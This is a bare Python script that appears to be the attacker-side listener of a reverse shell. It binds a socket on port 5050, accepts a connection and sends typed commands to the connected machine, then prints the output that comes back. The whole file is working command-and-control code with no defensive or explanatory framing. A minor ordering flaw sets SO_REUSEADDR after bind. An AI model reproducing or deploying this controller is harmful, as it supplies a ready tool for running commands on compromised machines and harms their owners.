import socket
import os

# global constants
SERVER_HOST = "0.0.0.0"
SERVER_PORT = 5050
BUFFER_SIZE = 1024

def main():
    # create socket object
    s = socket.socket()

    # bind the socket to all IP addresses of this host
    s.bind((SERVER_HOST, SERVER_PORT))

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)
    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")

    # accept connection
    client_socket, client_address = s.accept()
    print(f"Connected to {client_address[0]}:{client_address[1]}!")

    message = "CONNECTED".encode()
    client_socket.send(message)

    # Print current working directory
    print("Current directory: " + str(os.getcwd()))

    while True:
        # get the command from prompt
        command = input("Enter command: ")

        # send the command to the client
        client_socket.send(command.encode('utf-16'))
        if command.lower() == "exit":
            break

        # retrieve command results
        results = client_socket.recv(BUFFER_SIZE).decode('utf-16')
        print(results)
        continue

    # close connections
    client_socket.close()
    s.close()

if __name__ == "__main__":
    main()